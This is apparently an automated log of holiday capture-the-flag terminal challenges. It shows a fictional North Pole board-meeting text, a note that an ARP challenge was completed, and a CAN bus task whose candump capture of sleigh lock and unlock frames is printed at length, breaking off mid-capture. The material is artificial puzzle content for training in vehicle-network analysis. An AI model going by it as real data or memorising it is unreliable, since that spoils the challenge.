                residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. 
                In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given
                 her adoption of Kris Kringle as a son early in his life.  
                Approved:
                Mother Nature
                Superman
                Clarice
                Yukon Cornelius
                Ginger Breaddie
                King Moonracer
                Mrs. Donner
                Charlie In the Box
                Krampus
                Dolly
                Snow Miser
                Alabaster Snowball
                Queen of the Winter Spirits
                Opposed: 
                                Jack Frost
                Resolution carries.  Construction approved.
                NEW BUSINESS:
                Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000
                 BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposa
                l, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.
                Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.

                
            
2020-12-31 18:17:26.911 +00:00 [VRB] Challenge ARPShenanigans completed
2020-12-31 18:17:26.913 +00:00 [VRB] Running challange CANBusInvestigation
2020-12-31 18:17:26.945 +00:00 [INF] CAN bus challenge

                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM
                MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM
                MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM
                MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM
                MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM
                MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM
                MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM
                MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM
                MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM
                MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM
                MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM
                MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM
                MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM
                MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

                Welcome to the CAN bus terminal challenge!

                In your home folder, there's a CAN bus capture from Santa's sleigh. Some of
                the data has been cleaned up, so don't worry - it isn't too noisy. What you
                will see is a record of the engine idling up and down. Also in the data are
                a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK?
                We'd like to encode another key mechanism.

                Find the decimal portion of the timestamp of the UNLOCK code in candump.log
                and submit it to ./runtoanswer!  (e.g., if the timestamp is 123456.112233,
                please submit 112233)
            
2020-12-31 18:17:27.042 +00:00 [INF] elf@58bf86f1423e:~$ cat candump.log
 
                (1608926660.800530) vcan0 244#0000000116
                (1608926660.812774) vcan0 244#00000001D3
                (1608926660.826327) vcan0 244#00000001A6
                (1608926660.839338) vcan0 244#00000001A3
                (1608926660.852786) vcan0 244#00000001B4
                (1608926660.866754) vcan0 244#000000018E
                (1608926660.879825) vcan0 244#000000015F
                (1608926660.892934) vcan0 244#0000000103
                (1608926660.904816) vcan0 244#0000000181
                (1608926660.920799) vcan0 244#000000015F
                (1608926660.934338) vcan0 244#0000000173
                (1608926660.946952) vcan0 244#0000000183
                (1608926660.962926) vcan0 244#0000000149
                (1608926660.970738) vcan0 188#00000000
                (1608926660.977487) vcan0 244#00000001E0
                (1608926660.989792) vcan0 244#00000001D6
                (1608926661.002690) vcan0 244#0000000145
                (1608926661.018189) vcan0 244#00000001E9
                (1608926661.031261) vcan0 244#00000001F9
                (1608926661.042719) vcan0 244#0000000185
                (1608926661.053863) vcan0 244#00000001AB
                (1608926661.066551) vcan0 244#00000001E0
                (1608926661.079120) vcan0 244#0000000157
                (1608926661.092179) vcan0 244#00000001BD
                (1608926661.105503) vcan0 244#0000000188
                (1608926661.120710) vcan0 244#0000000189
                (1608926661.133553) vcan0 244#00000001C0
                (1608926661.145725) vcan0 244#000000019E
                (1608926661.158666) vcan0 244#00000001E3
                (1608926661.173070) vcan0 244#0000000123
                (1608926661.184569) vcan0 244#00000001FC
                (1608926661.195901) vcan0 244#00000001C0
                (1608926661.209364) vcan0 244#0000000155
                (1608926661.220631) vcan0 244#00000001EB
                (1608926661.233510) vcan0 244#0000000182
                (1608926661.245964) vcan0 244#0000000195
                (1608926661.258201) vcan0 244#000000013B
                (1608926661.271293) vcan0 244#000000012B
                (1608926661.285172) vcan0 244#0000000191
                (1608926661.297488) vcan0 244#000000015A
                (1608926661.309332) vcan0 244#0000000148
                (1608926661.322653) vcan0 244#000000018E
                (1608926661.336724) vcan0 244#00000001EA
                (1608926661.348576) vcan0 244#00000001E7
                (1608926661.361548) vcan0 244#0000000174
                (1608926661.373583) vcan0 244#0000000167
                (1608926661.385352) vcan0 244#0000000159
                (1608926661.400643) vcan0 244#00000001D5
                (1608926661.413712) vcan0 244#00000001ED
                (1608926661.426704) vcan0 244#000000016F
                (1608926661.440028) vcan0 244#00000001F7
                (1608926661.454952) vcan0 244#00000001B4
                (1608926661.467504) vcan0 244#00000001EC
                (1608926661.474018) vcan0 188#00000000
                (1608926661.497162) vcan0 244#00000001EB
                (1608926661.509848) vcan0 244#000000010D
                (1608926661.522866) vcan0 244#0000000110
                (1608926661.535661) vcan0 244#0000000110
                (1608926661.548001) vcan0 244#000000016A
                (1608926661.563643) vcan0 244#00000001CA
                (1608926661.576051) vcan0 244#0000000110
                (1608926661.589781) vcan0 244#00000001A9
                (1608926661.602554) vcan0 244#00000001E2
                (1608926661.614449) vcan0 244#00000001EC
                (1608926661.626380) vcan0 244#000000019B
                (1608926661.638457) vcan0 244#000000016B
                (1608926661.651923) vcan0 244#000000018A
                (1608926661.664353) vcan0 244#00000001CD
                (1608926661.676152) vcan0 244#00000001C2
                (1608926661.688046) vcan0 244#0000000151
                (1608926661.700350) vcan0 244#000000017A
                (1608926661.711897) vcan0 244#0000000139
                (1608926661.723848) vcan0 244#0000000137
                (1608926661.736140) vcan0 244#00000001A4
                (1608926661.752191) vcan0 244#00000001C0
                (1608926661.764946) vcan0 244#000000013A
                (1608926661.779049) vcan0 244#0000000133
                (1608926661.793280) vcan0 244#0000000142
                (1608926661.806615) vcan0 244#00000001B1
                (1608926661.819373) vcan0 244#00000001A6
                (1608926661.838732) vcan0 244#000000014B
                (1608926661.854134) vcan0 244#00000001BC
                (1608926661.869750) vcan0 244#00000001B9
                (1608926661.887153) vcan0 244#000000019D
                (1608926661.899482) vcan0 244#00000001C4
                (1608926661.911868) vcan0 244#0000000140
                (1608926661.925341) vcan0 244#0000000146
                (1608926661.938001) vcan0 244#00000001F0
                (1608926661.950637) vcan0 244#000000016E
                (1608926661.963780) vcan0 244#00000001CD
                (1608926661.978084) vcan0 244#0000000157
                (1608926661.978259) vcan0 188#00000000
                (1608926661.992728) vcan0 244#000000019A
                (1608926662.005645) vcan0 244#0000000192
                (1608926662.019680) vcan0 244#0000000155
                (1608926662.049874) vcan0 244#0000000122
                (1608926662.066645) vcan0 244#00000001CA
                (1608926662.077366) vcan0 244#00000001DC
                (1608926662.092455) vcan0 244#0000000148
                (1608926662.107014) vcan0 244#00000001B3
                (1608926662.120549) vcan0 244#000000013B
                (1608926662.135345) vcan0 244#0000000136
                (1608926662.147581) vcan0 244#00000001C9
                (1608926662.159970) vcan0 244#0000000191
                (1608926662.300822) vcan0 244#000000018A
                (1608926662.314962) vcan0 244#000000018A
                (1608926662.327004) vcan0 244#00000001ED
                (1608926662.338878) vcan0 244#0000000161
                (1608926662.351935) vcan0 244#00000001D9
                (1608926662.363852) vcan0 244#000000014B
                (1608926662.375649) vcan0 244#00000001AF
                (1608926662.390980) vcan0 244#000000019B
                (1608926662.405242) vcan0 244#0000000134
                (1608926662.420102) vcan0 244#0000000187
                (1608926662.432350) vcan0 244#00000001F0
                (1608926662.445774) vcan0 244#000000016E
                (1608926662.457836) vcan0 244#00000001E8
                (1608926662.472519) vcan0 244#000000014D
                (1608926662.478577) vcan0 188#00000000
                (1608926662.484790) vcan0 244#00000001D0
                (1608926662.497708) vcan0 244#0000000175
                (1608926662.511038) vcan0 244#0000000157
                (1608926662.525266) vcan0 244#00000001B9
                (1608926662.539122) vcan0 244#00000001E8
                (1608926662.551746) vcan0 244#000000018E
                (1608926662.565696) vcan0 244#00000001E8
                (1608926662.580454) vcan0 244#000000015A
                (1608926662.594779) vcan0 244#00000001CC
                (1608926662.606767) vcan0 244#00000001CE
                (1608926662.618856) vcan0 244#00000001D3
                (1608926662.633226) vcan0 244#0000000130
                (1608926662.646379) vcan0 244#000000011D
                (1608926662.659207) vcan0 244#000000012A
                (1608926662.672728) vcan0 244#0000000103
                (1608926662.685353) vcan0 244#0000000102
                (1608926662.698549) vcan0 244#0000000157
                (1608926662.710804) vcan0 244#00000001AA
                (1608926662.724739) vcan0 244#00000001A8
                (1608926662.736974) vcan0 244#0000000160
                (1608926662.751613) vcan0 244#0000000127
                (1608926662.764767) vcan0 244#000000011E
                (1608926662.776498) vcan0 244#0000000149
                (1608926662.791623) vcan0 244#00000001F2
                (1608926662.804769) vcan0 244#0000000155
                (1608926662.818963) vcan0 244#000000011A
                (1608926662.833047) vcan0 244#0000000115
                (1608926662.847319) vcan0 244#0000000162
                (1608926662.862998) vcan0 244#0000000012
                (1608926662.875880) vcan0 244#0000000024
                (1608926662.888347) vcan0 244#0000000036
                (1608926662.901322) vcan0 244#0000000048
                (1608926662.914148) vcan0 244#000000005A
                (1608926662.925055) vcan0 244#000000006C
                (1608926662.938107) vcan0 244#000000007E
                (1608926662.950328) vcan0 244#0000000090
                (1608926662.962629) vcan0 244#00000000A2
                (1608926662.977599) vcan0 244#00000000B5
                (1608926662.977733) vcan0 188#00000000
                (1608926662.992760) vcan0 244#00000000C7
                (1608926663.011800) vcan0 244#00000000D9
                (1608926663.019913) vcan0 244#00000000EB
                (1608926663.036065) vcan0 244#00000000FD
                (1608926663.050314) vcan0 244#000000010F
                (1608926663.084956) vcan0 244#0000000121
                (1608926663.095873) vcan0 244#0000000133
                (1608926663.108499) vcan0 244#0000000145
                (1608926663.121307) vcan0 244#0000000157
                (1608926663.134884) vcan0 244#000000016A
                (1608926663.148361) vcan0 244#000000017C
                (1608926663.163176) vcan0 244#000000018E
                (1608926663.175988) vcan0 244#00000001A0
                (1608926663.188715) vcan0 244#00000001B2
                (1608926663.202484) vcan0 244#00000001C4
                (1608926663.217094) vcan0 244#00000001D6
                (1608926663.229824) vcan0 244#00000001E8
                (1608926663.241816) vcan0 244#00000001FA
                (1608926663.253274) vcan0 244#000000020D
                (1608926663.266142) vcan0 244#000000021F
                (1608926663.279655) vcan0 244#0000000231
                (1608926663.291745) vcan0 244#0000000243
                (1608926663.306737) vcan0 244#0000000255
                (1608926663.320910) vcan0 244#0000000267
                (1608926663.335251) vcan0 244#0000000279
                (1608926663.348101) vcan0 244#000000028B
                (1608926663.363482) vcan0 244#000000029D
                (1608926663.375607) vcan0 244#00000002AF
                (1608926663.389393) vcan0 244#00000002C2
                (1608926663.402386) vcan0 244#00000002D4
                (1608926663.414124) vcan0 244#00000002E6
                (1608926663.427578) vcan0 244#00000002F8
                (1608926663.441733) vcan0 244#000000030A
                (1608926663.456844) vcan0 244#000000031C
                (1608926663.469394) vcan0 244#000000032E
                (1608926663.482409) vcan0 244#0000000340
                (1608926663.483216) vcan0 188#00000000
                (1608926663.496846) vcan0 244#0000000352
                (1608926663.508878) vcan0 244#0000000365
                (1608926663.525275) vcan0 244#0000000377
                (1608926663.539046) vcan0 244#0000000389
                (1608926663.552461) vcan0 244#000000039B
                (1608926663.566030) vcan0 244#00000003AD
                (1608926663.578939) vcan0 244#00000003BF
                (1608926663.593612) vcan0 244#00000003D1
                (1608926663.607026) vcan0 244#00000003E3
                (1608926663.618775) vcan0 244#00000003F5
                (1608926663.634185) vcan0 244#0000000407
                (1608926663.647690) vcan0 244#000000041A
                (1608926663.660523) vcan0 244#000000042C
                (1608926663.675005) vcan0 244#000000043E
                (1608926663.688833) vcan0 244#0000000450
                (1608926663.699880) vcan0 244#0000000462
                (1608926663.712198) vcan0 244#0000000474
                (1608926663.724508) vcan0 244#0000000486
                (1608926663.736229) vcan0 244#0000000498
                (1608926663.748694) vcan0 244#00000004AA
                (1608926663.762446) vcan0 244#00000004BD
                (1608926663.776172) vcan0 244#00000004CF
                (1608926663.791213) vcan0 244#00000004E1
                (1608926663.804979) vcan0 244#00000004F3
                (1608926663.821508) vcan0 244#0000000505
                (1608926663.834550) vcan0 244#0000000517
                (1608926663.848430) vcan0 244#0000000529
                (1608926663.861471) vcan0 244#000000053B
                (1608926663.876565) vcan0 244#000000054D
                (1608926663.889607) vcan0 244#000000055F
                (1608926663.902160) vcan0 244#0000000572
                (1608926663.916553) vcan0 244#0000000584
                (1608926663.929340) vcan0 244#0000000596
                (1608926663.942516) vcan0 244#00000005A8
                (1608926663.955049) vcan0 244#00000005BA
                (1608926663.968577) vcan0 244#00000005CC
                (1608926663.981517) vcan0 244#00000005DE
                (1608926663.989726) vcan0 188#00000000
                (1608926663.998660) vcan0 244#00000005F0
                (1608926664.020416) vcan0 244#0000000602
                (1608926664.036324) vcan0 244#0000000615
                (1608926664.057593) vcan0 244#0000000627
                (1608926664.078890) vcan0 244#0000000639
                (1608926664.094480) vcan0 244#000000064B
                (1608926664.128465) vcan0 244#000000065D
                (1608926664.161405) vcan0 244#000000066F
                (1608926664.173912) vcan0 244#0000000681
                (1608926664.186034) vcan0 244#0000000693
                (1608926664.197777) vcan0 244#00000006A5
                (1608926664.210633) vcan0 244#00000006B7
                (1608926664.222200) vcan0 244#00000006CA
                (1608926664.235982) vcan0 244#00000006DC
                (1608926664.247990) vcan0 244#00000006EE
                (1608926664.264136) vcan0 244#0000000700
                (1608926664.277038) vcan0 244#0000000712
                (1608926664.290232) vcan0 244#0000000724
                (1608926664.304080) vcan0 244#0000000736
                (1608926664.319201) vcan0 244#0000000748
                (1608926664.332318) vcan0 244#000000075A
                (1608926664.346533) vcan0 244#000000076D
                (1608926664.359862) vcan0 244#000000077F
                (1608926664.371866) vcan0 244#0000000791
                (1608926664.384379) vcan0 244#00000007A3
                (1608926664.397970) vcan0 244#00000007B5
                (1608926664.409742) vcan0 244#00000007C7
                (1608926664.421955) vcan0 244#00000007D9
                (1608926664.433653) vcan0 244#00000007EB
                (1608926664.445598) vcan0 244#00000007FD
                (1608926664.457825) vcan0 244#000000080F
                (1608926664.469800) vcan0 244#0000000822
                (1608926664.484453) vcan0 244#0000000834
                (1608926664.491259) vcan0 188#00000000
                (1608926664.498188) vcan0 244#0000000846
                (1608926664.512142) vcan0 244#0000000858
                (1608926664.523899) vcan0 244#000000086A
                (1608926664.538077) vcan0 244#000000087C
                (1608926664.552689) vcan0 244#000000088E
                (1608926664.568050) vcan0 244#00000008A0
                (1608926664.582114) vcan0 244#00000008B2
                (1608926664.595860) vcan0 244#00000008C5
                (1608926664.608634) vcan0 244#00000008D7
                (1608926664.623887) vcan0 244#00000008E9
                (1608926664.626448) vcan0 19B#000000000000
                (1608926664.635745) vcan0 244#00000008FB
                (1608926664.647559) vcan0 244#000000090D
                (1608926664.661009) vcan0 244#000000091F
                (1608926664.673421) vcan0 244#0000000931
                (1608926664.686012) vcan0 244#0000000943
                (1608926664.698832) vcan0 244#0000000955
                (1608926664.712077) vcan0 244#0000000967
                (1608926664.725623) vcan0 244#000000097A
                (1608926664.738804) vcan0 244#000000098C
                (1608926664.751359) vcan0 244#000000099E
                (1608926664.763545) vcan0 244#00000009B0
                (1608926664.777448) vcan0 244#00000009C2
                (1608926664.791887) vcan0 244#00000009D4
                (1608926664.804779) vcan0 244#00000009E6
                (1608926664.817468) vcan0 244#00000009F8
                (1608926664.831084) vcan0 244#0000000A0A
                (1608926664.844710) vcan0 244#0000000A1D
                (1608926664.857410) vcan0 244#0000000A2F
                (1608926664.871109) vcan0 244#0000000A41
                (1608926664.884847) vcan0 244#0000000A53
                (1608926664.897191) vcan0 244#0000000A65
                (1608926664.909212) vcan0 244#0000000A77
                (1608926664.922841) vcan0 244#0000000A89
                (1608926664.935527) vcan0 244#0000000A9B
                (1608926664.947798) vcan0 244#0000000AAD
                (1608926664.961673) vcan0 244#0000000ABF
                (1608926664.974470) vcan0 244#0000000AD2
                (1608926664.989125) vcan0 244#0000000AE4
                (1608926664.996093) vcan0 188#00000000
                (1608926665.010315) vcan0 244#0000000AF6
                (1608926665.025938) vcan0 244#0000000B08
                (1608926665.042230) vcan0 244#0000000B1A
                (1608926665.050576) vcan0 244#0000000B2C
                (1608926665.064938) vcan0 244#0000000B3E
                (1608926665.079511) vcan0 244#0000000B50
                (1608926665.092246) vcan0 244#0000000B62
                (1608926665.106383) vcan0 244#0000000B75
                (1608926665.119228) vcan0 244#0000000B87
                (1608926665.132860) vcan0 244#0000000B99
                (1608926665.147306) vcan0 244#0000000BAB
                (1608926665.161820) vcan0 244#0000000BBD
                (1608926665.175060) vcan0 244#0000000BCF
                (1608926665.189888) vcan0 244#0000000BE1
                (1608926665.204797) vcan0 244#0000000BF3
                (1608926665.219216) vcan0 244#0000000C05
                (1608926665.232862) vcan0 244#0000000C17
                (1608926665.246496) vcan0 244#0000000C2A
                (1608926665.259009) vcan0 244#0000000C3C
                (1608926665.271042) vcan0 244#0000000C4E
                (1608926665.285321) vcan0 244#0000000C60
                (1608926665.299198) vcan0 244#0000000C72
                (1608926665.312034) vcan0 244#0000000C84
                (1608926665.325972) vcan0 244#0000000C96
                (1608926665.339844) vcan0 244#0000000CA8
                (1608926665.353596) vcan0 244#0000000CBA
                (1608926665.367323) vcan0 244#0000000CCD
                (1608926665.380032) vcan0 244#0000000CDF
                (1608926665.393884) vcan0 244#0000000CF1
                (1608926665.407106) vcan0 244#0000000D03
                (1608926665.421574) vcan0 244#0000000D15
                (1608926665.434151) vcan0 244#0000000D27
                (1608926665.446509) vcan0 244#0000000D39
                (1608926665.459320) vcan0 244#0000000D4B
                (1608926665.472658) vcan0 244#0000000D5D
                (1608926665.485048) vcan0 244#0000000D6F
                (1608926665.498823) vcan0 244#0000000D82
                (1608926665.499007) vcan0 188#00000000
                (1608926665.511558) vcan0 244#0000000D94
                (1608926665.523837) vcan0 244#0000000DA6
                (1608926665.537455) vcan0 244#0000000DB8
                (1608926665.551709) vcan0 244#0000000DCA
                (1608926665.563573) vcan0 244#0000000DDC
                (1608926665.576273) vcan0 244#0000000DEE
                (1608926665.589820) vcan0 244#0000000E00
                (1608926665.602756) vcan0 244#0000000E12
                (1608926665.617774) vcan0 244#0000000E24
                (1608926665.633061) vcan0 244#0000000E37
                (1608926665.646454) vcan0 244#0000000E49
                (1608926665.659637) vcan0 244#0000000E5B
                (1608926665.674159) vcan0 244#0000000E6D
                (1608926665.687478) vcan0 244#0000000E7F
                (1608926665.699855) vcan0 244#0000000E91
                (1608926665.713405) vcan0 244#0000000EA3
                (1608926665.729998) vcan0 244#0000000EB5
                (1608926665.742669) vcan0 244#0000000EC7
                (1608926665.756448) vcan0 244#0000000EDA
                (1608926665.768203) vcan0 244#0000000EEC
                (1608926665.781218) vcan0 244#0000000EFE
                (1608926665.797186) vcan0 244#0000000F10
                (1608926665.809704) vcan0 244#0000000F22
                (1608926665.824233) vcan0 244#0000000F34
                (1608926665.837554) vcan0 244#0000000F46
                (1608926665.849683) vcan0 244#0000000F58
                (1608926665.863475) vcan0 244#0000000F6A
                (1608926665.876267) vcan0 244#0000000F7C
                (1608926665.890399) vcan0 244#0000000F8F
                (1608926665.903908) vcan0 244#0000000FA1
                (1608926665.917009) vcan0 244#0000000FB3
                (1608926665.929606) vcan0 244#0000000FC5
                (1608926665.942412) vcan0 244#0000000FD7
                (1608926665.956432) vcan0 244#0000000FE9
                (1608926665.970580) vcan0 244#0000000FFB
                (1608926665.983752) vcan0 244#000000100D
                (1608926666.000070) vcan0 244#000000101F
                (1608926666.009849) vcan0 244#0000001032
                (1608926666.009926) vcan0 188#00000000
                (1608926666.024054) vcan0 244#0000001044
                (1608926666.039577) vcan0 244#0000001056
                (1608926666.048316) vcan0 244#0000001068
                (1608926666.061635) vcan0 244#000000107A
                (1608926666.075431) vcan0 244#000000108C
                (1608926666.088018) vcan0 244#000000109E
                (1608926666.100922) vcan0 244#00000010B0
                (1608926666.114527) vcan0 244#00000010C2
                (1608926666.126482) vcan0 244#00000010D4
                (1608926666.140020) vcan0 244#00000010E7
                (1608926666.153537) vcan0 244#00000010F9
                (1608926666.167921) vcan0 244#000000110B
                (1608926666.181639) vcan0 244#000000111D
                (1608926666.195192) vcan0 244#000000112F
                (1608926666.206892) vcan0 244#0000001141
                (1608926666.220209) vcan0 244#0000001153
                (1608926666.232867) vcan0 244#0000001165
                (1608926666.244841) vcan0 244#0000001177
                (1608926666.260051) vcan0 244#000000118A
                (1608926666.277286) vcan0 244#000000119C
                (1608926666.290863) vcan0 244#00000011AE
                (1608926666.304918) vcan0 244#00000011C0
                (1608926666.317809) vcan0 244#00000011D2
                (1608926666.331887) vcan0 244#00000011E4
                (1608926666.343966) vcan0 244#00000011F6
                (1608926666.360417) vcan0 244#0000001208
                (1608926666.381721) vcan0 244#000000121A
                (1608926666.393288) vcan0 244#000000122C
                (1608926666.406241) vcan0 244#000000123F
                (1608926666.419322) vcan0 244#0000001251
                (1608926666.431681) vcan0 244#0000001263
                (1608926666.451026) vcan0 244#0000001275
                (1608926666.464794) vcan0 244#0000001287
                (1608926666.478499) vcan0 244#0000001299
                (1608926666.491986) vcan0 244#00000012AB
                (1608926666.506388) vcan0 244#00000012BD
                (1608926666.512371) vcan0 188#00000000
                (1608926666.518466) vcan0 244#00000012CF
                (1608926666.530123) vcan0 244#00000012E2
                (1608926666.542339) vcan0 244#00000012F4
                (1608926666.556583) vcan0 244#0000001306
                (1608926666.569917) vcan0 244#0000001318
                (1608926666.581029) vcan0 244#000000132A
                (1608926666.594331) vcan0 244#000000133C
                (1608926666.607171) vcan0 244#000000134E
                (1608926666.623528) vcan0 244#0000001360
                (1608926666.638805) vcan0 244#0000001372
                (1608926666.651844) vcan0 244#0000001384
                (1608926666.669536) vcan0 244#0000001397
                (1608926666.682218) vcan0 244#00000013A9
                (1608926666.695626) vcan0 244#00000013BB
                (1608926666.708564) vcan0 244#00000013CD
                (1608926666.721031) vcan0 244#00000013DF
                (1608926666.735641) vcan0 244#00000013F1
                (1608926666.748140) vcan0 244#0000001403
                (1608926666.760552) vcan0 244#0000001415
                (1608926666.772413) vcan0 244#0000001427
                (1608926666.784548) vcan0 244#000000143A
                (1608926666.795981) vcan0 244#000000144C
                (1608926666.807776) vcan0 244#000000145E
                (1608926666.820304) vcan0 244#0000001470
                (1608926666.832901) vcan0 244#0000001482
                (1608926666.850950) vcan0 244#0000001494
                (1608926666.863172) vcan0 244#00000014A6
                (1608926666.874937) vcan0 244#00000014B8
                (1608926666.888715) vcan0 244#00000014CA
                (1608926666.900996) vcan0 244#00000014DC
                (1608926666.914338) vcan0 244#00000014EF
                (1608926666.925659) vcan0 244#0000001501
                (1608926666.937843) vcan0 244#0000001513
                (1608926666.950368) vcan0 244#0000001525
                (1608926666.963823) vcan0 244#0000001537
                (1608926666.978921) vcan0 244#0000001549
                (1608926666.997692) vcan0 244#000000155B
                (1608926667.013303) vcan0 244#000000156D
                (1608926667.013385) vcan0 188#00000000
                (1608926667.032531) vcan0 244#000000157F
                (1608926667.049236) vcan0 244#0000001592
                (1608926667.065330) vcan0 244#00000015A4
                (1608926667.081881) vcan0 244#00000015B6
                (1608926667.098395) vcan0 244#00000015C8
                (1608926667.112199) vcan0 244#00000015DA
                (1608926667.126197) vcan0 244#00000015EC
                (1608926667.140148) vcan0 244#00000015FE
                (1608926667.152769) vcan0 244#0000001610
                (1608926667.165707) vcan0 244#0000001622
                (1608926667.178629) vcan0 244#0000001634
                (1608926667.191677) vcan0 244#0000001647
                (1608926667.204217) vcan0 244#0000001659
                (1608926667.217847) vcan0 244#000000166B
                (1608926667.231315) vcan0 244#000000167D
                (1608926667.245347) vcan0 244#000000168F
                (1608926667.259254) vcan0 244#00000016A1
                (1608926667.271657) vcan0 244#00000016B3
                (1608926667.284136) vcan0 244#00000016C5
                (1608926667.297701) vcan0 244#00000016D7
                (1608926667.311626) vcan0 244#00000016EA
                (1608926667.325463) vcan0 244#00000016FC
                (1608926667.337766) vcan0 244#000000170E
                (1608926667.350367) vcan0 244#0000001720
                (1608926667.363496) vcan0 244#0000001732
                (1608926667.376008) vcan0 244#0000001744
                (1608926667.389773) vcan0 244#0000001756
                (1608926667.402708) vcan0 244#0000001768
                (1608926667.415924) vcan0 244#000000177A
                (1608926667.428075) vcan0 244#000000178C
                (1608926667.442296) vcan0 244#000000179F
                (1608926667.453613) vcan0 244#00000017B1
                (1608926667.467184) vcan0 244#00000017C3
                (1608926667.481775) vcan0 244#00000017D5
                (1608926667.494631) vcan0 244#00000017E7
                (1608926667.507234) vcan0 244#00000017F9
                (1608926667.520158) vcan0 244#000000180B
                (1608926667.520201) vcan0 188#00000000
                (1608926667.532004) vcan0 244#000000181D
                (1608926667.544029) vcan0 244#000000182F
                (1608926667.557966) vcan0 244#0000001841
                (1608926667.571141) vcan0 244#0000001854
                (1608926667.583068) vcan0 244#0000001866
                (1608926667.595472) vcan0 244#0000001878
                (1608926667.607968) vcan0 244#000000188A
                (1608926667.620688) vcan0 244#000000189C
                (1608926667.632910) vcan0 244#00000018AE
                (1608926667.646229) vcan0 244#00000018C0
                (1608926667.658173) vcan0 244#00000018D2
                (1608926667.671161) vcan0 244#00000018E4
                (1608926667.686081) vcan0 244#00000018F7
                (1608926667.699322) vcan0 244#0000001909
                (1608926667.712494) vcan0 244#000000191B
                (1608926667.724046) vcan0 244#000000192D
                (1608926667.737315) vcan0 244#000000193F
                (1608926667.754557) vcan0 244#0000001951
                (1608926667.772404) vcan0 244#0000001963
                (1608926667.785119) vcan0 244#0000001975
                (1608926667.799447) vcan0 244#0000001987
                (1608926667.812428) vcan0 244#0000001999
                (1608926667.824938) vcan0 244#00000019AC
                (1608926667.837300) vcan0 244#00000019BE
                (1608926667.849350) vcan0 244#00000019D0
                (1608926667.863374) vcan0 244#00000019E2
                (1608926667.880747) vcan0 244#00000019F4
                (1608926667.894983) vcan0 244#0000001A06
                (1608926667.908768) vcan0 244#0000001A18
                (1608926667.922387) vcan0 244#0000001A2A
                (1608926667.934650) vcan0 244#0000001A3C
                (1608926667.948235) vcan0 244#0000001A4F
                (1608926667.961636) vcan0 244#0000001A61
                (1608926667.976630) vcan0 244#0000001A73
                (1608926667.989755) vcan0 244#0000001A85
                (1608926668.007205) vcan0 244#0000001A97
                (1608926668.022718) vcan0 244#0000001AA9
                (1608926668.022800) vcan0 188#00000000
                (1608926668.034742) vcan0 244#0000001ABB
                (1608926668.047299) vcan0 244#0000001ACD
                (1608926668.062827) vcan0 244#0000001ADF
                (1608926668.075039) vcan0 244#0000001AF1
                (1608926668.088475) vcan0 244#0000001B04
                (1608926668.100045) vcan0 244#0000001B16
                (1608926668.112133) vcan0 244#0000001B28
                (1608926668.124152) vcan0 244#0000001B3A
                (1608926668.136430) vcan0 244#0000001B4C
                (1608926668.149044) vcan0 244#0000001B5E
                (1608926668.165051) vcan0 244#0000001B70
                (1608926668.177303) vcan0 244#0000001B82
                (1608926668.188838) vcan0 244#0000001B94
                (1608926668.201136) vcan0 244#0000001BA7
                (1608926668.212991) vcan0 244#0000001BB9
                (1608926668.225218) vcan0 244#0000001BCB
                (1608926668.237669) vcan0 244#0000001BDD
                (1608926668.252777) vcan0 244#0000001BEF
                (1608926668.266329) vcan0 244#0000001C01
                (1608926668.281019) vcan0 244#0000001C13
                (1608926668.293830) vcan0 244#0000001C25
